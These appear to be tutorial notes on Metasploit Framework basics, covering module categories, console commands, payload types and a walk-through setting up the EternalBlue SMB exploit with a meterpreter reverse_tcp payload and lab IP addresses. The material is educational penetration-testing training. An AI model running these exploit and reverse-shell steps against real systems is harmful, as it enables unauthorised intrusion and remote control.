# Metasploit Framework Basics

While using the Metasploit Framework, you will primarily interact with the **Metasploit console**.  
You can launch it from the AttackBox terminal using:

```bash
msfconsole
```

The console is your main interface to interact with the different modules of the framework.
Modules are components designed to perform specific tasks such as exploiting vulnerabilities, scanning, or brute-forcing.

## Key Concepts

**Exploit:** A piece of code that uses a vulnerability on the target system.

**Vulnerability:** A design, coding, or logic flaw affecting the system (can lead to code execution or data disclosure).

**Payload:** Code that runs on the target system after a successful exploit (e.g., reverse shell, file execution).

## Metasploit Module Categories

### Auxiliary
Supporting modules like scanners, crawlers, and fuzzers.

```bash
tree -L 1 auxiliary/
```

```
auxiliary/
├── admin
├── analyze
├── bnat
├── client
├── cloud
├── crawler
├── dos
├── fileformat
├── fuzzers
├── gather
├── parser
├── scanner
├── sniffer
├── spoof
├── sqli
└── voip
```

### Encoders
Encodes exploits/payloads to attempt to evade signature-based antivirus detection.

```bash
tree -L 1 encoders/
```

```
encoders/
├── cmd
├── generic
├── mipsbe
├── mipsle
├── php
├── ppc
├── ruby
├── sparc
├── x64
└── x86
```

### Evasion
Designed to bypass AV/security products more effectively than encoders.

```bash
tree -L 2 evasion/
```

```
evasion/
└── windows
    ├── applocker_evasion_install_util.rb
    ├── applocker_evasion_msbuild.rb
    ├── process_herpaderping.rb
    ├── syscall_inject.rb
    └── windows_defender_exe.rb
```

### Exploits
Organized by operating system and target.

```bash
tree -L 1 exploits/
```

```
exploits/
├── aix
├── android
├── apple_ios
├── bsd
├── firefox
├── freebsd
├── linux
├── multi
├── osx
├── solaris
├── unix
└── windows
```

### NOPs
Do nothing (e.g., Intel 0x90). Used for buffer alignment and consistent payload sizes.

```bash
tree -L 1 nops/
```

```
nops/
├── aarch64
├── armle
├── cmd
├── php
├── sparc
├── x64
└── x86
```

### Payloads
Code that runs on the target after exploitation.

```bash
tree -L 1 payloads/
```

```
payloads/
├── adapters
├── singles
├── stagers
└── stages
```

**Adapters:** Wrap payloads in different formats (e.g., PowerShell).

**Singles:** Self-contained payloads (e.g., add user, run notepad.exe).

**Stagers:** Establish a communication channel (small initial payload).

**Stages:** Larger payloads downloaded after the stager runs.

**Example:**

- `generic/shell_reverse_tcp` → inline (single) payload.
- `windows/x64/shell/reverse_tcp` → staged payload.

### Post
Modules used in post-exploitation phase.

```bash
tree -L 1 post/
```

```
post/
├── aix
├── android
├── apple_ios
├── bsd
├── firefox
├── linux
├── multi
├── osx
└── windows
```

## Using msfconsole

Start the console:

```bash
msfconsole
```

Output example:

```
=[ metasploit v6.0                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops      ]
+ -- --=[ 7 evasion                                ]
```

## Basic Commands

### Linux commands
You can run Linux commands inside msfconsole:

```bash
msf6 > ls
msf6 > ping -c 1 8.8.8.8
```

### Help
```bash
msf6 > help set
```
Shows syntax and usage for the set command.

### History
```bash
msf6 > history
```
Lists previously used commands.

### Tab Completion
Type `he` + Tab → auto-completes to `help`.

## Contexts in Metasploit

Metasploit has different prompts depending on context:

- `root@...:~#` → Normal shell (outside Metasploit).
- `msf6 >` → Metasploit console (no context).
- `msf6 exploit(...) >` → Module context (e.g., exploit, auxiliary).
- `meterpreter >` → Meterpreter session.
- `C:\Windows\system32>` → Shell on target system.

## Example: EternalBlue Exploit

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

Example output (important parameters):

```
RHOSTS   → Target IP
RPORT    → Target port (default 445)
PAYLOAD  → windows/x64/meterpreter/reverse_tcp
LHOST    → Attacker IP
LPORT    → Listening port
```

Set parameters:

```bash
set RHOSTS 10.10.165.39
set LHOST 10.10.44.70
```

## Parameter Reference

- **RHOSTS** → Target IP(s) or file (`file:/path/targets.txt`)
- **RPORT** → Target port
- **PAYLOAD** → Payload type (shell, meterpreter, etc.)
- **LHOST** → Attacker's IP
- **LPORT** → Listening port on attacker's machine
- **SESSION** → Session ID for post modules

Unset values:

```bash
unset PARAMETER
unset all
```

Global values:

```bash
setg PARAMETER VALUE
```

## Searching Modules

Search by keyword, CVE, type, or platform:

```bash
search ms17-010
search type:auxiliary telnet
```

Example output:

```
#  Name                                      Rank   Check  Description
-  ----                                      ----   -----  -----------
2  exploit/windows/smb/ms17_010_eternalblue  avg    Yes    SMB Remote Windows Kernel Pool Corruption
```

Use module by name or index:

```bash
use 2
```

## Exploit Ranking

Metasploit ranks exploits by reliability:

- **Excellent** → Consistently works.
- **Great** → Works reliably.
- **Good** → Generally works.
- **Average** → May cause crashes.
- **Normal** → Unstable.
- **Manual** → Requires manual setup.

Source: [Metasploit Wiki](https://github.com/rapid7/metasploit-framework/wiki)

## Summary

- `msfconsole` is the main Metasploit interface.
- Modules = exploits, payloads, scanners, post modules, etc.
- Parameters like `RHOSTS`, `LHOST`, and `PAYLOAD` must be set.
- Use `search`, `use`, `set`, `show options`, and `run` to operate modules.
- Exploits have different reliability ranks.
- Context is important: exploit, auxiliary, post, meterpreter, shell.